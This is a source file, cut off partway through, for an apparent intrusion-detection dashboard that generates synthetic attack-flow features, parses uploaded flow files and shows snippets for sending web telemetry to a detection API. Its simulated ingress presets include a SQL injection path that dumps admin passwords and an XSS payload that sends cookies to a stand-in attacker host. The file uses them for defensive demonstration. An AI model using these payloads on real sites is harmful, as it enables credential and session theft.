import { useState, useEffect, useRef } from 'react'
import {
  Send,
  RefreshCw,
  Zap,
  Play,
  Square,
  Shuffle,
  Activity,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Cpu,
  Layers,
  Terminal,
  Copy,
  Check,
  Flame,
  ExternalLink,
  Shield,
  Hash,
  ChevronDown,
  Sparkles,
  Upload,
  FileSpreadsheet,
  Radio,
  Globe,
  Code2,
  Server,
  Eye,
  Filter,
  PlayCircle,
  PauseCircle,
  Trash2,
  ArrowUpRight,
  ArrowDownLeft,
  X
} from 'lucide-react'
import { Link } from 'react-router-dom'
import { api } from '../lib/api/client.ts'
import { attackColor } from '../utils/helpers.js'

// Realistic live HTTP web ingress flow templates simulating protected application telemetry
const INGRESS_PRESETS = [
  { method: 'GET', path: '/api/v1/products?limit=20', category: 'Normal Traffic', ip: '198.51.100.14', label: 'BENIGN' },
  { method: 'POST', path: '/api/v1/auth/login', category: 'Normal Traffic', ip: '192.168.1.45', label: 'BENIGN' },
  { method: 'GET', path: '/search?category=electronics', category: 'Normal Traffic', ip: '198.51.100.72', label: 'BENIGN' },
  { method: 'POST', path: '/checkout/process-payment', category: 'Normal Traffic', ip: '198.51.100.89', label: 'BENIGN' },
  { method: 'GET', path: "/products?id=1' UNION SELECT username,password FROM admin_users--", category: 'Web Exploits', ip: '185.220.101.5', label: 'SQL_INJECTION' },
  { method: 'POST', path: '/api/v1/auth/login', category: 'Brute Force', ip: '194.26.29.112', label: 'BRUTE_FORCE_WEB' },
  { method: 'POST', path: '/ssh/service-auth', category: 'Brute Force', ip: '45.33.32.156', label: 'BRUTE_FORCE_SSH' },
  { method: 'GET', path: '/search?q=<script>document.location="http://evil.io/c="+document.cookie</script>', category: 'Web Exploits', ip: '103.251.167.20', label: 'XSS' },
  { method: 'GET', path: '/catalog/index.html', category: 'DoS Attacks', ip: '195.154.60.22', label: 'HTTP_FLOOD' },
  { method: 'POST', path: '/gateway/syn-probe', category: 'DDoS & Floods', ip: '178.62.204.88', label: 'SYN_FLOOD' },
  { method: 'GET', path: '/.env', category: 'Recon & Scans', ip: '89.248.163.74', label: 'PORT_SCAN' },
  { method: 'POST', path: '/api/v1/sync/telemetry', category: 'Malware & C2', ip: '91.240.118.230', label: 'C2_BEACON' },
  { method: 'POST', path: '/backup/data-chunk.tar', category: 'Zero-Day & Infil', ip: '185.191.171.12', label: 'DATA_EXFILTRATION' },
  { method: 'POST', path: '/cgi-bin/payload.elf', category: 'Zero-Day & Infil', ip: '194.135.31.8', label: 'ZERO_DAY_EXPLOIT' }
]

// Copy-paste integration snippets for connecting external web servers to KOPO IDS
const SDK_SNIPPETS = {
  express: `// 1. Install axios: npm install axios
// 2. Add this middleware to your Express.js web server:
const axios = require('axios');

app.use(async (req, res, next) => {
  const startTime = Date.now();
  
  res.on('finish', () => {
    const durationUs = (Date.now() - startTime) * 1000;
    const bytesIn = Number(req.headers['content-length'] || 60);
    
    // Asynchronously dispatch ingress flow to KOPO IDS
    axios.post('http://localhost:8000/api/detect', {
      source_ip: req.ip || req.connection.remoteAddress || '198.51.100.1',
      dest_ip: '10.0.0.1',
      features: {
        'Protocol': 6,
        'Destination Port': 80,
        'Flow Duration': durationUs,
        'Total Fwd Packets': 1,
        'Total Backward Packets': 1,
        'Fwd Packet Length Max': bytesIn,
        'Flow Bytes/s': bytesIn / Math.max(durationUs / 1e6, 0.001),
        'SYN Flag Count': 1,
        'ACK Flag Count': 1
      }
    }).catch(err => console.error('[KOPO-IDS] Telemetry error:', err.message));
  });

  next();
});`,

  fastapi: `# Add KOPO Ingress Inspector Middleware to your FastAPI application:
import time
import httpx
from fastapi import FastAPI, Request

app = FastAPI()

@app.middleware("http")
async def kopo_ingress_guard(request: Request, call_next):
    start = time.perf_counter()
    response = await call_next(request)
    duration_us = (time.perf_counter() - start) * 1_000_000
    
    # Asynchronously stream request telemetry to KOPO IDS
    try:
        async with httpx.AsyncClient(timeout=0.5) as client:
            await client.post("http://localhost:8000/api/detect", json={
                "source_ip": request.client.host if request.client else "198.51.100.1",
                "dest_ip": "10.0.0.1",
                "features": {
                    "Protocol": 6,
                    "Destination Port": 80,
                    "Flow Duration": duration_us,
                    "Total Fwd Packets": 1,
                    "Total Backward Packets": 1,
                    "SYN Flag Count": 1,
                    "ACK Flag Count": 1
                }
            })
    except Exception:
        pass  # Non-blocking async inspection
        
    return response`,

  nginx: `# Nginx Mirroring: Pipe all live web traffic to KOPO IDS in real time
server {
    listen 80;
    server_name my-protected-website.com;

    location / {
        # Duplicate live ingress traffic to KOPO IDS engine
        mirror /kopo_mirror;
        mirror_request_body on;
        proxy_pass http://backend_app_upstream;
    }

    location = /kopo_mirror {
        internal;
        proxy_pass http://127.0.0.1:8000/api/detect;
        proxy_pass_request_body on;
        proxy_set_header X-Forwarded-For $remote_addr;
    }
}`,

  curl: `# Direct Webhook Ingress Telemetry API call:
curl -X POST http://localhost:8000/api/detect \\
  -H "Content-Type: application/json" \\
  -d '{
    "source_ip": "198.51.100.42",
    "dest_ip": "10.0.0.1",
    "features": {
      "Protocol": 6,
      "Destination Port": 80,
      "Flow Duration": 500000,
      "Total Fwd Packets": 12,
      "Total Backward Packets": 10,
      "Flow Bytes/s": 24000.0,
      "SYN Flag Count": 1,
      "ACK Flag Count": 10
    }
  }'`
}

// 35 Categorized Cyber Attack Vectors with DoS & DDoS clearly separated
export const THREAT_CATEGORIES = [
  {
    id: 'benign',
    name: 'Normal Traffic',
    shortName: 'Normal',
    icon: '🛡️',
    color: 'var(--accent-green)',
    subtypes: ['BENIGN']
  },
  {
    id: 'dos',
    name: 'DoS Attacks',
    shortName: 'DoS',
    icon: '⏳',
    color: 'var(--accent-amber)',
    subtypes: ['HTTP_FLOOD', 'SLOWLORIS', 'SLOWHTTPTEST', 'PING_OF_DEATH', 'TEARDROP', 'LAND_ATTACK']
  },
  {
    id: 'ddos',
    name: 'DDoS & Floods',
    shortName: 'DDoS',
    icon: '⚡',
    color: 'var(--accent-red)',
    subtypes: ['SYN_FLOOD', 'UDP_FLOOD', 'ICMP_FLOOD', 'DNS_AMPLIFICATION', 'NTP_AMPLIFICATION', 'SMURF']
  },
  {
    id: 'scans',
    name: 'Recon & Scans',
    shortName: 'Scans',
    icon: '🔍',
    color: 'var(--accent-cyan)',
    subtypes: ['PORT_SCAN', 'SYN_SCAN', 'NULL_SCAN', 'FIN_SCAN', 'XMAS_SCAN']
  },
  {
    id: 'brute',
    name: 'Brute Force',
    shortName: 'Brute Force',
    icon: '🔑',
    color: 'var(--accent-purple)',
    subtypes: ['BRUTE_FORCE_SSH', 'BRUTE_FORCE_FTP', 'BRUTE_FORCE_WEB', 'SSH_PATATOR', 'FTP_PATATOR']
  },
  {
    id: 'web',
    name: 'Web Exploits',
    shortName: 'Web Attacks',
    icon: '🌐',
    color: '#ff6b35',
    subtypes: ['SQL_INJECTION', 'XSS', 'WEB_ATTACK', 'HEARTBLEED', 'PHISHING']
  },
  {
    id: 'malware',
    name: 'Malware & C2',
    shortName: 'Malware',
    icon: '🦠',
    color: '#ff79c6',
    subtypes: ['BOTNET', 'RANSOMWARE', 'C2_BEACON', 'CRYPTOMINING']
  },
  {
    id: 'zero_day',
    name: 'Zero-Day & Infil',
    shortName: 'Zero-Day',
    icon: '🚨',
    color: '#ff5555',
    subtypes: ['DATA_EXFILTRATION', 'ZERO_DAY_EXPLOIT', 'EMAIL_SPAM']
  }
]

export const ALL_SUBTYPES = THREAT_CATEGORIES.flatMap(c => c.subtypes)

// Accurate Parameter Synthesis across all 35 attack types
export function generateAttackParams(label) {
  let dur, fwd, bwd, size, syn, ack, fin = 0, rst = 0, psh = 0, urg = 0, proto = 6, port = 80

  if (label === 'BENIGN' || label === 'Normal HTTP' || label === 'Normal') {
    dur = Math.floor(Math.random() * 2500000) + 150000
    fwd = Math.floor(Math.random() * 20) + 3
    bwd = Math.floor(Math.random() * 20) + 2
    size = [60, 220, 512, 1460][Math.floor(Math.random() * 4)]
    syn = 1; ack = bwd; psh = Math.floor(Math.random() * 4) + 1
    port = [80, 443, 22, 53][Math.floor(Math.random() * 4)]
    proto = port === 53 ? 17 : 6
  } else if (label === 'HTTP_FLOOD' || label === 'DoS Attack' || label === 'DOS' || label === 'DoS') {
    dur = Math.floor(Math.random() * 500000) + 300000; fwd = Math.floor(Math.random() * 10000) + 5000
    bwd = Math.floor(Math.random() * 80) + 20; size = 1460; syn = 1; ack = bwd; port = 80; proto = 6
  } else if (label === 'SLOWLORIS') {
    dur = Math.floor(Math.random() * 90000000) + 30000000; fwd = Math.floor(Math.random() * 150) + 50
    bwd = Math.floor(Math.random() * 80) + 20; size = [1, 2, 5][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; port = 80; proto = 6
  } else if (label === 'SLOWHTTPTEST') {
    dur = Math.floor(Math.random() * 70000000) + 20000000; fwd = Math.floor(Math.random() * 300) + 100
    bwd = Math.floor(Math.random() * 150) + 50; size = [10, 20, 50][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; port = 80; proto = 6
  } else if (label === 'PING_OF_DEATH') {
    dur = Math.floor(Math.random() * 800000) + 100000; fwd = Math.floor(Math.random() * 40) + 10; bwd = 0
    size = [1473, 1600, 2000][Math.floor(Math.random() * 3)]; syn = 0; ack = 0; proto = 1; port = 0
  } else if (label === 'TEARDROP') {
    dur = Math.floor(Math.random() * 800000) + 100000; fwd = Math.floor(Math.random() * 300) + 100; bwd = 0
    size = [28, 40, 60][Math.floor(Math.random() * 3)]; syn = 0; ack = 0; proto = 17; port = 0
  } else if (label === 'LAND_ATTACK') {
    const f = Math.floor(Math.random() * 3000) + 1000
    dur = Math.floor(Math.random() * 800000) + 100000; fwd = f; bwd = 0; size = 60; syn = f; ack = 0; port = 80; proto = 6
  } else if (label === 'SYN_FLOOD' || label === 'DDoS Attack' || label === 'DDOS') {
    const f = Math.floor(Math.random() * 8000) + 2500
    dur = Math.floor(Math.random() * 150000) + 50000; fwd = f; bwd = 0; size = 60; syn = f; ack = 0; port = 80; proto = 6
  } else if (label === 'UDP_FLOOD') {
    dur = Math.floor(Math.random() * 80000) + 20000; fwd = Math.floor(Math.random() * 15000) + 5000; bwd = 0
    size = [512, 1024][Math.floor(Math.random() * 2)]; syn = 0; ack = 0; proto = 17; port = 53
  } else if (label === 'ICMP_FLOOD') {
    dur = Math.floor(Math.random() * 80000) + 20000; fwd = Math.floor(Math.random() * 12000) + 3000; bwd = 0
    size = [64, 128][Math.floor(Math.random() * 2)]; syn = 0; ack = 0; proto = 1; port = 0
  } else if (label === 'DNS_AMPLIFICATION') {
    dur = Math.floor(Math.random() * 800000) + 100000; fwd = Math.floor(Math.random() * 3000) + 1000
    bwd = Math.floor(Math.random() * 15000) + 5000; size = 512; syn = 0; ack = 0; proto = 17; port = 53
  } else if (label === 'NTP_AMPLIFICATION') {
    dur = Math.floor(Math.random() * 800000) + 100000; fwd = Math.floor(Math.random() * 2500) + 800
    bwd = Math.floor(Math.random() * 12000) + 4000; size = 480; syn = 0; ack = 0; proto = 17; port = 123
  } else if (label === 'SMURF') {
    dur = Math.floor(Math.random() * 800000) + 100000; fwd = Math.floor(Math.random() * 3000) + 1000
    bwd = Math.floor(Math.random() * 15000) + 5000; size = 64; syn = 0; ack = 0; proto = 1; port = 0
  } else if (label === 'PORT_SCAN' || label === 'Port Scan') {
    const f = Math.random() < 0.5 ? Math.floor(Math.random() * 3) + 1 : Math.floor(Math.random() * 250) + 50
    dur = Math.floor(Math.random() * 3000000) + 2000; fwd = f; bwd = 0; size = 0; syn = f; ack = 0; port = Math.floor(Math.random() * 1024) + 1; proto = 6
  } else if (label === 'SYN_SCAN') {
    const f = Math.floor(Math.random() * 250) + 50
    dur = Math.floor(Math.random() * 2000000) + 2000; fwd = f; bwd = 0; size = 0; syn = f; ack = 0; port = Math.floor(Math.random() * 1024) + 1; proto = 6
  } else if (label === 'NULL_SCAN') {
    dur = Math.floor(Math.random() * 2000000) + 2000; fwd = Math.floor(Math.random() * 120) + 40; bwd = 0; size = 0; syn = 0; ack = 0; port = Math.floor(Math.random() * 1024) + 1; proto = 6
  } else if (label === 'FIN_SCAN') {
    const f = Math.floor(Math.random() * 120) + 40
    dur = Math.floor(Math.random() * 2000000) + 2000; fwd = f; bwd = 0; size = 0; syn = 0; ack = 0; fin = f; port = Math.floor(Math.random() * 1024) + 1; proto = 6
  } else if (label === 'XMAS_SCAN') {
    const f = Math.floor(Math.random() * 120) + 40
    dur = Math.floor(Math.random() * 2000000) + 2000; fwd = f; bwd = 0; size = 0; syn = 0; ack = 0; fin = f; psh = f; urg = f; port = Math.floor(Math.random() * 1024) + 1; proto = 6
  } else if (label.includes('BRUTE_FORCE') || label.includes('PATATOR') || label === 'Brute Force') {
    dur = Math.floor(Math.random() * 50000000) + 10000000; fwd = Math.floor(Math.random() * 1500) + 500; bwd = fwd
    size = [200, 300, 400][Math.floor(Math.random() * 3)]; syn = 1; ack = fwd + bwd; port = label.includes('FTP') ? 21 : label.includes('WEB') ? 80 : 22; proto = 6
  } else if (label === 'SQL_INJECTION' || label === 'Web Attack') {
    dur = Math.floor(Math.random() * 8000000) + 1000000; fwd = Math.floor(Math.random() * 80) + 20; bwd = Math.floor(Math.random() * 80) + 20
    size = [800, 1200, 1460][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; psh = fwd; port = 80; proto = 6
  } else if (label === 'XSS') {
    dur = Math.floor(Math.random() * 6000000) + 1000000; fwd = Math.floor(Math.random() * 60) + 15; bwd = Math.floor(Math.random() * 60) + 15
    size = [500, 700, 900][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; psh = fwd; port = 80; proto = 6
  } else if (label === 'WEB_ATTACK') {
    dur = Math.floor(Math.random() * 20000000) + 4000000; fwd = Math.floor(Math.random() * 300) + 80; bwd = Math.floor(Math.random() * 300) + 80
    size = [600, 900, 1200][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; psh = fwd; port = 80; proto = 6
  } else if (label === 'HEARTBLEED') {
    dur = Math.floor(Math.random() * 4000000) + 500000; fwd = Math.floor(Math.random() * 40) + 10; bwd = Math.floor(Math.random() * 40) + 10
    size = 1460; syn = 1; ack = bwd; psh = fwd; port = 443; proto = 6
  } else if (label === 'PHISHING') {
    dur = Math.floor(Math.random() * 4000000) + 500000; fwd = Math.floor(Math.random() * 50) + 10; bwd = Math.floor(Math.random() * 50) + 10
    size = [400, 600, 800][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; psh = fwd; port = 80; proto = 6
  } else if (label === 'BOTNET') {
    dur = Math.floor(Math.random() * 25000000) + 5000000; fwd = Math.floor(Math.random() * 200) + 40; bwd = Math.floor(Math.random() * 200) + 40
    size = [100, 300, 600][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; port = Math.floor(Math.random() * 50000) + 1024; proto = 6
  } else if (label === 'RANSOMWARE') {
    dur = Math.floor(Math.random() * 200000000) + 50000000; fwd = Math.floor(Math.random() * 3000) + 1000
    bwd = Math.floor(Math.random() * 6000) + 2000; size = [1000, 1200, 1400][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; psh = fwd; port = 445; proto = 6
  } else if (label === 'C2_BEACON') {
    dur = Math.floor(Math.random() * 45000000) + 10000000; fwd = Math.floor(Math.random() * 70) + 20; bwd = fwd
    size = [100, 200, 300][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; port = 4444; proto = 6
  } else if (label === 'CRYPTOMINING') {
    dur = Math.floor(Math.random() * 400000000) + 100000000; fwd = Math.floor(Math.random() * 500) + 150; bwd = fwd
    size = [300, 600, 900][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; port = 3333; proto = 6
  } else if (label === 'DATA_EXFILTRATION') {
    dur = Math.floor(Math.random() * 120000000) + 30000000; fwd = Math.floor(Math.random() * 300) + 80
    bwd = Math.floor(Math.random() * 6000) + 2000; size = 1460; syn = 1; ack = bwd; port = 443; proto = 6
  } else if (label === 'ZERO_DAY_EXPLOIT' || label === 'Abnormal (Zero-Day)') {
    dur = Math.floor(Math.random() * 500000) + 100000; fwd = 1; bwd = 1
    size = 1460; syn = 0; ack = 1; urg = 4; port = 8088; proto = 6
  } else if (label === 'EMAIL_SPAM') {
    dur = Math.floor(Math.random() * 25000000) + 5000000; fwd = Math.floor(Math.random() * 300) + 80
    bwd = Math.floor(Math.random() * 200) + 40; size = [400, 800, 1200][Math.floor(Math.random() * 3)]; syn = 1; ack = bwd; port = 25; proto = 6
  } else {
    dur = 500000; fwd = 5000; bwd = 50; size = 1460; syn = 1; ack = 50; port = 80; proto = 6
  }

  return { dur, fwd, bwd, size, syn, ack, fin, rst, psh, urg, proto, port }
}

// Dynamic synthetic flow generator supporting both 10 and 77 features
export function makeDynamicFlow(label, mode = 77) {
  const p = generateAttackParams(label)
  const totalFwd = p.fwd * p.size
  const totalBwd = p.bwd * p.size
  const durSec = Math.max(p.dur / 1e6, 1e-6)
  const iat = p.dur / Math.max(p.fwd, 1)
  const bwdIat = p.bwd ? p.dur / p.bwd : 0

  if (mode === 10) {
    return {
      "Protocol": p.proto,
      "Flow Duration": p.dur,
      "Total Fwd Packets": p.fwd,
      "Total Backward Packets": p.bwd,
      "Fwd Packet Length Max": p.size,
      "Flow Bytes/s": Math.round(((totalFwd + totalBwd) / durSec) * 100) / 100,
      "Flow Packets/s": Math.round(((p.fwd + p.bwd) / durSec) * 100) / 100,
      "SYN Flag Count": p.syn,
      "ACK Flag Count": p.ack,
      "Avg Packet Size": p.fwd ? Math.round((totalFwd / p.fwd) * 100) / 100 : 0
    }
  }

  // 77-Feature Full Spectrum
  return {
    "Destination Port": p.port,
    "Protocol": p.proto,
    "Flow Duration": p.dur,
    "Total Fwd Packets": p.fwd,
    "Total Backward Packets": p.bwd,
    "Total Length of Fwd Packets": totalFwd,
    "Total Length of Bwd Packets": totalBwd,
    "Fwd Packet Length Max": p.size,
    "Fwd Packet Length Min": p.size,
    "Fwd Packet Length Mean": Number(p.size.toFixed(1)),
    "Fwd Packet Length Std": 0.0,
    "Bwd Packet Length Max": p.bwd ? p.size : 0,
    "Bwd Packet Length Min": p.bwd ? p.size : 0,
    "Bwd Packet Length Mean": p.bwd ? Number(p.size.toFixed(1)) : 0.0,
    "Bwd Packet Length Std": 0.0,
    "Flow Bytes/s": Math.round(((totalFwd + totalBwd) / durSec) * 100) / 100,
    "Flow Packets/s": Math.round(((p.fwd + p.bwd) / durSec) * 100) / 100,
    "Flow IAT Mean": Math.round(iat * 100) / 100,
    "Flow IAT Std": 0.0,
    "Flow IAT Max": Math.round(iat * 100) / 100,
    "Flow IAT Min": Math.round(iat * 100) / 100,
    "Fwd IAT Total": p.dur,
    "Fwd IAT Mean": Math.round(iat * 100) / 100,
    "Fwd IAT Std": 0.0,
    "Fwd IAT Max": Math.round(iat * 100) / 100,
    "Fwd IAT Min": Math.round(iat * 100) / 100,
    "Bwd IAT Total": p.bwd ? p.dur : 0,
    "Bwd IAT Mean": Math.round(bwdIat * 100) / 100,
    "Bwd IAT Std": 0.0,
    "Bwd IAT Max": Math.round(bwdIat * 100) / 100,
    "Bwd IAT Min": Math.round(bwdIat * 100) / 100,
    "Fwd PSH Flags": p.psh > 0 ? 1 : 0,
    "Bwd PSH Flags": 0,
    "Fwd URG Flags": p.urg > 0 ? 1 : 0,
    "Bwd URG Flags": 0,
    "Fwd Header Length": p.fwd * 20,
    "Bwd Header Length": p.bwd * 20,
    "Fwd Packets/s": Math.round((p.fwd / durSec) * 100) / 100,
    "Bwd Packets/s": Math.round((p.bwd / durSec) * 100) / 100,
    "Min Packet Length": Math.min(p.size, 60),
    "Max Packet Length": Math.max(p.size, 60),
    "Packet Length Mean": Number(p.size.toFixed(1)),
    "Packet Length Std": 0.0,
    "Packet Length Variance": 0.0,
    "FIN Flag Count": p.fin,
    "SYN Flag Count": p.syn,
    "RST Flag Count": p.rst,
    "PSH Flag Count": p.psh,
    "ACK Flag Count": p.ack,
    "URG Flag Count": p.urg,
    "CWE Flag Count": 0,
    "ECE Flag Count": 0,
    "Down/Up Ratio": Math.round((p.bwd / Math.max(p.fwd, 1)) * 100000) / 100000,
    "Average Packet Size": Number(p.size.toFixed(1)),
    "Avg Fwd Segment Size": Number(p.size.toFixed(1)),
    "Avg Bwd Segment Size": p.bwd ? Number(p.size.toFixed(1)) : 0.0,
    "Fwd Header Length.1": p.fwd * 20,
    "Fwd Avg Bytes/Bulk": 0,
    "Fwd Avg Packets/Bulk": 0,
    "Fwd Avg Bulk Rate": 0,
    "Bwd Avg Bytes/Bulk": 0,
    "Bwd Avg Packets/Bulk": 0,
    "Bwd Avg Bulk Rate": 0,
    "Subflow Fwd Packets": p.fwd,
    "Subflow Fwd Bytes": totalFwd,
    "Subflow Bwd Packets": p.bwd,
    "Subflow Bwd Bytes": totalBwd,
    "Init_Win_bytes_forward": 8192,
    "Init_Win_bytes_backward": p.bwd ? 65535 : 0,
    "act_data_pkt_fwd": Math.max(p.fwd - 1, 0),
    "min_seg_size_forward": 20,
    "Active Mean": label === 'BENIGN' ? 0.0 : p.dur / 2.0,
    "Active Std": 0.0,
    "Active Max": label === 'BENIGN' ? 0 : Math.floor(p.dur / 2),
    "Active Min": label === 'BENIGN' ? 0 : Math.floor(p.dur / 2),
    "Idle Mean": label === 'BENIGN' ? 0.0 : p.dur / 2.0,
    "Idle Std": 0.0,
    "Idle Max": label === 'BENIGN' ? 0 : Math.floor(p.dur / 2),
    "Idle Min": label === 'BENIGN' ? 0 : Math.floor(p.dur / 2)
  }
}

export default function Detect() {
  const [schemaMode, setSchemaMode] = useState(77) // 77 or 10 features
  const [activeCategory, setActiveCategory] = useState('Normal Traffic')
  const [activeSubtype, setActiveSubtype] = useState('BENIGN')
  const [openDropdown, setOpenDropdown] = useState(null)
  const [featureText, setFeatureText] = useState('')
  const [result, setResult] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)
  const [copied, setCopied] = useState(false)
  const [isStreaming, setIsStreaming] = useState(false)
  const [streamInterval, setStreamInterval] = useState(3)
  const [streamCount, setStreamCount] = useState(0)
  const timerRef = useRef(null)
  const dropdownRef = useRef(null)

  // CSV / Batch Flow Injection State
  const [csvFileName, setCsvFileName] = useState(null)
  const [csvFileObj, setCsvFileObj] = useState(null)
  const [csvRows, setCsvRows] = useState([])
  const [csvRowIndex, setCsvRowIndex] = useState(0)
  const [batchUploading, setBatchUploading] = useState(false)
  const [batchAutoAggregate, setBatchAutoAggregate] = useState(true)
  const [batchSummary, setBatchSummary] = useState(null)
  const fileInputRef = useRef(null)

  // Live Web Ingress / Protected Website Telemetry State
  const [isIngressActive, setIsIngressActive] = useState(false)
  const [ingressLogs, setIngressLogs] = useState([])
  const [isIngressSimulating, setIsIngressSimulating] = useState(true)
  const [ingressInterval, setIngressInterval] = useState(2)
  const [ingressHost, setIngressHost] = useState('https://shop.kopo-defense.internal')
  const [showSdkModal, setShowSdkModal] = useState(false)
  const [activeSdkTab, setActiveSdkTab] = useState('express')
  const [filterThreatOnly, setFilterThreatOnly] = useState(false)
  const ingressTimerRef = useRef(null)

  function handleCsvFile(e) {
    const file = e.target.files?.[0]
    if (!file) return
    setCsvFileName(file.name)
    setCsvFileObj(file)
    setBatchSummary(null)
    setError(null)
    const reader = new FileReader()
    reader.onload = (evt) => {
      const text = evt.target?.result
      if (typeof text !== 'string') return
      const trimmed = text.trim()
      if (!trimmed) return

      const lowerName = file.name.toLowerCase()
      const rows = []
      if (lowerName.endsWith('.json') || lowerName.endsWith('.jsonl') || trimmed.startsWith('{') || trimmed.startsWith('[')) {
        try {
          const parsed = JSON.parse(trimmed)
          const arr = Array.isArray(parsed)
            ? parsed
            : Array.isArray(parsed?.flows)
              ? parsed.flows
              : [parsed]
          arr.forEach(item => {
            if (item && typeof item === 'object') {
              rows.push(item.features && typeof item.features === 'object' ? item.features : item)
            }
          })
        } catch {
          trimmed.split(/\r?\n/).forEach(line => {
            const cleanLine = line.trim()
            if (!cleanLine) return
            try {
              const obj = JSON.parse(cleanLine)
              if (obj && typeof obj === 'object') {
                rows.push(obj.features && typeof obj.features === 'object' ? obj.features : obj)
              }
            } catch {
              // ignore malformed line during preview
            }
          })
        }
      } else {
        const lines = trimmed.split(/\r?\n/).filter(l => l.trim().length > 0)
        if (lines.length < 2) return
        const headers = lines[0].split(',').map(h => h.trim().replace(/^"|"$/g, ''))
        for (let i = 1; i < lines.length; i++) {
          const parts = lines[i].split(',').map(p => p.trim().replace(/^"|"$/g, ''))
          if (parts.length === headers.length) {
            const rowObj = {}
            headers.forEach((h, idx) => {
              const val = parts[idx]
              const num = Number(val)
              rowObj[h] = isNaN(num) ? val : num
            })
            rows.push(rowObj)
          }
        }
      }

      setCsvRows(rows)
      setCsvRowIndex(0)
      if (rows.length > 0) {
        loadCsvRow(rows[0], 0)
      }
    }
    reader.readAsText(file)
  }

  async function handleBatchUpload() {
    if (!csvFileObj) return
    setBatchUploading(true)
    setError(null)
    try {
      const summary = await api.uploadFlowsFile(csvFileObj, batchAutoAggregate)
      setBatchSummary(summary)
    } catch (err) {
      setError(`Batch upload error: ${err.message}`)
    } finally {
      setBatchUploading(false)
    }
  }

  function loadCsvRow(row, idx) {
    setCsvRowIndex(idx)
    const clean = { ...row }
    delete clean.Label
    delete clean.label
    setFeatureText(JSON.stringify(clean, null, 2))
    executeDetect(clean)
  }

  function getPlainLanguageCaption(res) {
    if (!res) return null
    if (res.attack_type === 'BENIGN') {
      return 'RFC-Standard Benign Communication: Flow timing, packet sizes, and flag sequencing fully match normal operating baseline. No hostile deviation detected.'
    }
    if (res.attack_type === 'HTTP_FLOOD' || res.attack_type === 'DoS') {
      return 'Volumetric HTTP Flood: Rapid asymmetric forward transmission (>16,000 pps) aimed at saturating web socket pools. Supervised ensemble confirms DoS intrusion.'
    }
    if (res.attack_type === 'SYN_FLOOD' || res.attack_type === 'DDoS') {
      return 'Distributed SYN Flood: Unidirectional storm of TCP SYN requests with zero completion handshakes. Engineered to deplete server connection tracking tables.'
    }
    if (res.attack_type.includes('BRUTE_FORCE')) {
      return 'Automated Credential Attack: High-frequency repetitive payload bursts against service authentication ports (SSH/FTP). Signature matches brute-force dictionary attack.'
    }
    if (res.attack_type.includes('SCAN')) {
      return 'Reconnaissance Probe: Sequential port discovery packets with zero payload bytes. Signature indicates automated vulnerability scanning and network discovery.'
    }
    if (res.attack_type === 'SQL_INJECTION' || res.attack_type === 'WEB_ATTACK') {
      return 'Application Layer Exploit: Anomalous push-flag payloads containing database injection signatures targeting web application backend.'
    }
    if (res.attack_type === 'RANSOMWARE' || res.attack_type === 'BOTNET' || res.attack_type === 'C2_BEACON') {
      return 'Malicious C2 / Exfiltration: Sustained high-entropy outbound transmissions over SMB or obscure ports matching ransomware data staging and botnet command heartbeat.'
    }
    return `Anomalous pattern identified by supervised consensus models as ${res.attack_type} (${res.attack_category || 'Threat'}). Forwarded to Tier 1/2 SOC investigation.`
  }

  // Initialize with Normal flow
  useEffect(() => {
    const initialFlow = makeDynamicFlow('BENIGN', schemaMode)
    setFeatureText(JSON.stringify(initialFlow, null, 2))
  }, [schemaMode])

  // Close dropdown on outside click
  useEffect(() => {
    function handleClickOutside(e) {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target)) {
        setOpenDropdown(null)
      }
    }
    document.addEventListener('mousedown', handleClickOutside)
    return () => document.removeEventListener('mousedown', handleClickOutside)
  }, [])

  function handleModeChange(newMode) {
    setSchemaMode(newMode)
    if (isStreaming) stopStreaming()
    const dynamicFlow = makeDynamicFlow(activeSubtype, newMode)
    setFeatureText(JSON.stringify(dynamicFlow, null, 2))
    setResult(null)
    setError(null)
  }

  function selectCategory(cat) {
    if (isStreaming) stopStreaming()
    const sub = cat.subtypes[Math.floor(Math.random() * cat.subtypes.length)]
    applyFlow(cat.name, sub)
  }

  function selectSubtype(catName, sub) {
    if (isStreaming) stopStreaming()
    setOpenDropdown(null)
    applyFlow(catName, sub)
  }

  function randomizeAny() {
    if (isStreaming) stopStreaming()
    // Pick any attack category (or normal)
    const randomCat = THREAT_CATEGORIES[Math.floor(Math.random() * THREAT_CATEGORIES.length)]
    const randomSub = randomCat.subtypes[Math.floor(Math.random() * randomCat.subtypes.length)]
    applyFlow(randomCat.name, randomSub)
  }

  function applyFlow(catName, subtype) {
    setActiveCategory(catName)
    setActiveSubtype(subtype)
    const flow = makeDynamicFlow(subtype, schemaMode)
    setFeatureText(JSON.stringify(flow, null, 2))
    executeDetect(flow)
  }

  async function executeDetect(featuresObj = null) {
    setLoading(true)
    setError(null)
    try {
      let features = featuresObj
      if (!features) {
        let text = (featureText || '').trim()
        let parsed
        try {
          parsed = JSON.parse(text)
        } catch (err) {
          const fixed = text.replace(/'/g, '"')
          parsed = JSON.parse(fixed)
        }
        features = (parsed && parsed.features && typeof parsed.features === 'object') ? parsed.features : parsed
      }
      const res = await api.detect({ features })
      setResult(res)
      if (isStreaming) {
        setStreamCount(prev => prev + 1)
      }
    } catch (e) {
      setError(e.message)
    } finally {
      setLoading(false)
    }
  }

  function startStreaming() {
    setIsStreaming(true)
    setStreamCount(0)
  }

  function stopStreaming() {
    setIsStreaming(false)
    if (timerRef.current) {
      clearInterval(timerRef.current)
      timerRef.current = null
    }
  }

  useEffect(() => {
    if (isStreaming) {
      timerRef.current = setInterval(() => {
        const randomCat = THREAT_CATEGORIES[Math.floor(Math.random() * THREAT_CATEGORIES.length)]
        const randomSub = randomCat.subtypes[Math.floor(Math.random() * randomCat.subtypes.length)]
        applyFlow(randomCat.name, randomSub)
      }, streamInterval * 1000)
    } else {
      if (timerRef.current) {
        clearInterval(timerRef.current)
        timerRef.current = null
      }
    }
    return () => {
